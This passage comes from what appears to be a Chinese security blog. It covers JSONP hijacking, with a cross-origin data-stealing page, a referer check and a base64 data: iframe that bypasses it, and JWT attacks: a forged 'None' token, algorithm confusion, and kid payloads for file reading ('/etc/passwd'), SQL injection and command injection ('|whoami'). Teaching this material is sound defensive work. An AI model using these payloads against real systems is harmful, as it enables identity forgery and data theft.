class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Test<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">data</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    alert(<span class=\"string\">&quot;name:&quot;</span>+data.name+<span class=\"string\">&quot;\\n&quot;</span><span class=\"string\">&quot;age:&quot;</span>+data.age);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://yourls.me:4444/data.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>2、JS文件在此域名下</p>\n<p><code>http://yourls.me:4444/data.js</code></p>\n<p><img src=\"/images/jsonp/image-20200627114105044.png\" alt=\"image-20200627114105044\"></p>\n<p>3、访问<code>http://bwapp.me:4444/data.html</code>跨域访问成功</p>\n<p><img src=\"/images/jsonp/image-20200627114330651.png\" alt=\"image-20200627114330651\"></p>\n<h4 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h4><p>bwapp.me直接获取data.js内的数据，因data.js内只有一个函数，如涉及多个函数，data.html(客户端)将导致客户端无法确定调哪个函数。而无法输出对应数据。</p>\n<p>data.html</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Test<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">data</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    alert(<span class=\"string\">&quot;name:&quot;</span>+data.name+<span class=\"string\">&quot;age:&quot;</span>+data.age);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"javascript\"><span class=\"comment\">//新建一个test1函数</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span>(<span class=\"params\">test3</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    alert(<span class=\"string\">&quot;name:&quot;</span>=test3.name+<span class=\"string\">&quot;city:&quot;</span>+test3.city);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">//访问后并不能直接输出对应数据信息。</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://yourls.me:4444/data.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JSONP动态调用\"><a href=\"#JSONP动态调用\" class=\"headerlink\" title=\"JSONP动态调用\"></a>JSONP动态调用</h4><p>在客户端中添加callback回调函数</p>\n<p>data.html</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Test<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span>(<span class=\"params\">data</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            alert(<span class=\"string\">&quot;name:&quot;</span> + data.name + <span class=\"string\">&quot;city:&quot;</span> + data.city);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test2</span>(<span class=\"params\">data</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            alert(<span class=\"string\">&quot;name:&quot;</span> + data.name);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://yourls.me:4444/data.php?callback=test1&amp;name=si1ent&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--&lt;script src=&quot;http://yourls.me:4444/data.php?callback=test1&amp;name=si1ent&quot;&gt;&lt;/script&gt;--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>data.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$data1=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;name&quot;</span>=&gt;<span class=\"string\">&quot;si1ent&quot;</span>,<span class=\"string\">&quot;city&quot;</span>=&gt;<span class=\"string\">&quot;Anhui&quot;</span>);</span><br><span class=\"line\">$data2=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;name&quot;</span>=&gt;<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;city&quot;</span>=&gt;<span class=\"string\">&quot;SH&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">&#x27;name&#x27;</span>]===<span class=\"string\">&#x27;si1ent&#x27;</span>) &#123;</span><br><span class=\"line\">    $data=$data1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">&#x27;name&#x27;</span>]===<span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">    $data=$data2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$callback = $_GET[<span class=\"string\">&#x27;callback&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">exit</span>($callback.<span class=\"string\">&quot;(&quot;</span>.json_encode($data).<span class=\"string\">&quot;)&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>访问</p>\n<p><code>http://bwapp.me:4444/data.html</code></p>\n<p><code>http://yourls.me:4444/data.php?callback=test1&amp;name=si1ent</code></p>\n<p><img src=\"/images/jsonp/image-20200627134931765.png\" alt=\"image-20200627134931765\"></p>\n<p>注：</p>\n<p>因前后端都存在两条以上数据，这里指定了callback==test1因此会弹出名字及城市信息。</p>\n<p>如callback=test2，则只会显示name对应值，不显示城市信息。</p>\n<p><img src=\"/images/jsonp/image-20200627135745378.png\" alt=\"image-20200627135745378\"></p>\n<h4 id=\"jQuery调用JSONP\"><a href=\"#jQuery调用JSONP\" class=\"headerlink\" title=\"jQuery调用JSONP\"></a>jQuery调用JSONP</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html &gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;Test&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;libs.baidu.com&#x2F;jquery&#x2F;1.9.0&#x2F;jquery.js&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class=\"line\">    $(document).ready(function()&#123;</span><br><span class=\"line\">        $.ajax(&#123;</span><br><span class=\"line\">             type: &quot;get&quot;,</span><br><span class=\"line\">             url: &quot;http:&#x2F;&#x2F;yourls.me:4444&#x2F;data.php?name&#x3D;admin&quot;,</span><br><span class=\"line\">             dataType: &quot;jsonp&quot;,</span><br><span class=\"line\">             jsonp: &quot;callback&quot;,&#x2F;&#x2F;传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)</span><br><span class=\"line\">             jsonpCallback:&quot;test1&quot;,&#x2F;&#x2F;自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写&quot;?&quot;，jQuery会自动为你处理数据</span><br><span class=\"line\">             success: function(data)&#123;</span><br><span class=\"line\">                 alert(&quot;name:&quot;+data.name+&quot;city:&quot;+data.city);</span><br><span class=\"line\">             &#125;,</span><br><span class=\"line\">             error: function()&#123;</span><br><span class=\"line\">                 alert(&#39;fail&#39;);</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jsonp/image-20200627140710365.png\" alt=\"image-20200627140710365\"></p>\n<p>jQuery会自动调用callback函数。</p>\n<h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>由以上实例及演示得知，JSONP是为了解决跨域而传输JSON格式数据的一种方式。</p>\n<h3 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h3><h4 id=\"JSONP劫持\"><a href=\"#JSONP劫持\" class=\"headerlink\" title=\"JSONP劫持\"></a>JSONP劫持</h4><p>JSONP本质上属于CSRF(跨站请求伪造：利用更多是修改密码等攻击)，而JSONP主要是攻击目标站点并获取数据的一种攻击方式。</p>\n<p>而造成这一问题的主要原因：目标站点未对请求的referer进行限制和检查，导致任何站点都可以访问JSON数据。</p>\n<h4 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h4><p>后台数据还是以data.php<code>http://yourls.me:4444/data.php</code>为主，而此时referer不再是<code>http://bwapp.me:4444/</code>而是新的地址<code>http://jsonp.me:4444/</code></p>\n<p> 新建jsonp.html文件（放到<code>http://jsonp.me:4444/</code>下）</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">csrf</span>(<span class=\"params\">data</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    alert(<span class=\"string\">&quot;name:&quot;</span>+data.name+<span class=\"string\">&quot;city:&quot;</span>+data.city);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://yourls.me:4444/data.php?callback=csrf&amp;name=admin&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<p><code>http://jsonp.me:4444/jsonp.html</code></p>\n<p><img src=\"/images/jsonp/image-20200627142742830.png\" alt=\"image-20200627142742830\"></p>\n<h4 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h4><p>1、限制referer</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($_SERVER[<span class=\"string\">&#x27;HTTP_REFERER&#x27;</span>]!==<span class=\"string\">&#x27;http://bwapp.me:4444/jquery.html&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;非法访问&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以下简单添加referer验证</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$data1=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;name&quot;</span>=&gt;<span class=\"string\">&quot;si1ent&quot;</span>,<span class=\"string\">&quot;city&quot;</span>=&gt;<span class=\"string\">&quot;Anhui&quot;</span>);</span><br><span class=\"line\">$data2=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;name&quot;</span>=&gt;<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;city&quot;</span>=&gt;<span class=\"string\">&quot;SH&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_SERVER[<span class=\"string\">&#x27;HTTP_REFERER&#x27;</span>]!==<span class=\"string\">&#x27;http://bwapp.me:4444/jquery.html&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span>(<span class=\"string\">&quot;非法访问&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">&#x27;name&#x27;</span>]===<span class=\"string\">&#x27;si1ent&#x27;</span>) &#123;</span><br><span class=\"line\">    $data=$data1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">&#x27;name&#x27;</span>]===<span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">    $data=$data2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$callback = $_GET[<span class=\"string\">&#x27;callback&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">exit</span>($callback.<span class=\"string\">&quot;(&quot;</span>.json_encode($data).<span class=\"string\">&quot;)&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jsonp/image-20200627145813752.png\" alt=\"image-20200627145813752\"></p>\n<p>2、使用token</p>\n<p>随机的生成一段token值，每次提交表单都要检查，攻击者没有token就不能访问（token后台服务随机分配）</p>\n<h4 id=\"绕过方式\"><a href=\"#绕过方式\" class=\"headerlink\" title=\"绕过方式\"></a>绕过方式</h4><p>利用<code>ftp://,http://,https://,file://,javascript:,data:</code>这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;data:text/html;base64,PHNjcmlwdD4KZnVuY3Rpb24gY3NyZihkYXRhKXsKICAgIGFsZXJ0KCJuYW1lOiIrZGF0YS5uYW1lKyJjaXR5OiIrZGF0YS5jaXR5KTsKfQo8L3NjcmlwdD4KPHNjcmlwdCBzcmM9Imh0dHA6Ly95b3VybHMubWU6NDQ0NC9kYXRhLnBocD9jYWxsYmFjaz1jc3JmJm5hbWU9YWRtaW4iPgo8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.smi1e.top&#x2F;%E6%B5%85%E8%B0%88-jsonp&#x2F;</span><br><span class=\"line\">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6539</span><br><span class=\"line\">https:&#x2F;&#x2F;blog.knownsec.com&#x2F;2015&#x2F;03&#x2F;jsonp_security_technic&#x2F;</span><br><span class=\"line\">之前乌云drops文档</span><br></pre></td></tr></table></figure>\n"},{"title":"JWT安全与实战","date":"2020-10-21T08:57:27.000Z","_content":"![1_XkmnsJ6Joa6EDFVGUw0tfA](/images/jwt/1_XkmnsJ6Joa6EDFVGUw0tfA.png)\n\n### JWT概述\n\n`JWT`的全称是`JSON Web Token`。遵循JSON格式，跨域认证解决方案。声明被存储在`客户端`，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。\n\n### 传统认证\n\n#### Cookie\n\n```\nHTTP 是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。\n\n假设要求登录认证的 Web 页面本身无法进行状态的管理（不记录已登录的状态），那么每次跳转新页面不是要再次登录，就是要在每次请求报文中附加参数来管理登录状态。\n\n不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的 CPU 及内存资源的消耗。从另一侧面来说，也正是因为 HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。\n\n保留无状态协议这个特征的同时又要解决类似的矛盾问题，于是引入了 Cookie 技术。Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。\n\nCookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。\n\n服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。”\n```\n\n摘录来自: 上野宣、于均良. “图解HTTP”。 \n\n### JWT组成\n\nJWT由三部分组成：`header`、`payload`、`signature`\n\n#### header\n\nheader部分最常用的两个字段是`alg`和`typ`，`alg`指定了token加密使用的算法（最常用的为`HMAC`和`RSA`算法），`typ`声明类型为JWT\n\nheader类似如下：\n\n```json\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n```\n\n#### payload\n\npayload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据：\n\n```json\n{\n    \"user_role\" : \"finn\",    \t//当前登录用户\n    \"iss\": \"admin\",          \t//该JWT的签发者,有些是URL\n    \"iat\": 1573440582,        //签发时间\n    \"exp\": 1573940267,        //过期时间\n    \"nbf\": 1573440582,        //该时间之前不接收处理该Token\n    \"domain\": \"example.com\",   //面向的用户\n    \"jti\": \"dff4214121e83057655e10bd9751d657\"   //Token唯一标识\n}\n```\n\n\n\n#### signature\n\nsignature的功能是保护token完整性；生成方式是将header和payload两个部分链接，然后通过header部分指定的`算法`，计算签名。\n\n抽象成公式就是\n\n`signature = HMAC-SHA256(base64urlEncode(header) + '.' + base64urlEncode(payload), secret_key`\n\n`注意：`编码header和payload时使用的编码方式为`base64urlencode`，`base64url`编码是`base64`的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充\"=\"号，并将标准Base64中的\"+\"和\"/\"分别改成了\"-\"和\"-\"。\n\n### JWT安全\n\n一个完整的jwt格式为(`header`.`payload`.`signature`)，其中header、payload使用`base64url`编码，signature通过指定算法生成。\n\n#### 加密算法\n\n##### 空加密算法\n\nJWT支持使用空加密算法，可以在header中指定alg为`None`\n\n这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。如下：\n\n```json\n{\n    \"alg\" : \"None\",\n    \"typ\" : \"jwt\"\n}\n{\n    \"user\" : \"Admin\"\n}\n```\n\n生成的完整token为`ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0`\n\n(header+'.'+payload，去掉了'.'+signature字段)\n\n空加密算法的设计初衷是用于调试的，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。\n\n##### RSA改为HMAC\n\nJWT中最常用的两种算法为`HMAC`和`RSA`。\n\n`HMAC`是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。\n\n`RSA`则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。\n\n在HMAC和RSA算法中，都是使用私钥对`signature`字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。\n\n现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥`pem`对JWT token进行签名，公钥`pub`对签名进行验证。\n\n```json\n{\n    \"alg\" : \"RS256\",\n    \"typ\" : \"jwt\"\n}\n```\n\n通常情况下密钥`pem`是无法获取到的，但是公钥`pub`却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即\n\n```json\n{\n    \"alg\" : \"HS256\",\n    \"typ\" : \"jwt\"\n}\n```\n\n同时使用获取到的公钥`pub`作为算法的密钥，对token进行签名，发送到服务器端。\n\n服务器端会将RSA的公钥（`pub`）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。\n\n`https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/`\n\n#### 密钥暴破\n\n暴破基础\n\n- 知悉JWT使用的加密算法\n- 一段有效的、已签名的token\n- 签名用的密钥不复杂（弱密钥）\n\n因此局限性还是较大\n\n工具参考如下：JWT-Tools\n\n简单的组合爆破起来相对较简单，一旦复杂起来将很难再进行实施爆破。\n\n#### 修改KID参数\n\n`kid`是jwt header中的一个可选参数，全称是`key ID`，它用于指定加密算法的密钥\n\n```json\n{\n    \"alg\" : \"HS256\",\n    \"typ\" : \"jwt\",\n    \"kid\" : \"/home/jwt/.ssh/pem\"\n}\n```\n\n因为该参数可以由用户输入，因此也可能造成一些安全问题。\n\n##### 任意文件读取\n\n`kid`参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，因此，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。\n\n```json\n{\n    \"alg\" : \"HS256\",\n    \"typ\" : \"jwt\",\n    \"kid\" : \"/etc/passwd\"\n}\n```\n\n##### SQL注入\n\n`kid`也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证。\n\n```json\n{\n    \"alg\" : \"HS256\",\n    \"typ\" : \"jwt\",\n    \"kid\" : \"key11111111' || union select 'secretkey' -- \"\n}\n```\n\n##### 命令执行\n\n对`kid`参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了`open`函数，通过构造参数就可能造成命令注入。\n\n```json\n\"/path/to/key_file|whoami\"\n```\n\n对于其他的语言，例如php，如果代码中使用的是`exec`或者是`system`来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。\n\n#### 修改JKU/X5U\n\n`JKU`的全称是\"JSON Web Key Set URL\"，用于指定一组用于验证令牌的密钥的URL。类似于`kid`，`JKU`也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。\n\n`X5U`则以URI的形式数允许攻击者指定用于验证令牌的**公钥证书或证书链**，与`JKU`的攻击利用方式类似。\n\n#### 信息泄漏\n\nJWT保证的是数据传输过程中的完整性而不是机密性。\n\n由于payload是使用`base64url`编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行`base64url`解码，就可以读取到payload中携带的信息。\n\n### JWT Tools\n\n[JWT爆破](https://github.com/brendan-rius/c-jwt-cracker)\n\n````shell\ngit clone https://github.com/brendan-rius/c-jwt-cracker.git\ncd c-jwt-cracker\nbrew install openssl\nmake OPENSSL=/usr/local/opt/openssl/include OPENSSL_LIB=-L/usr/local/opt/openssl/lib\n./jwtcrack 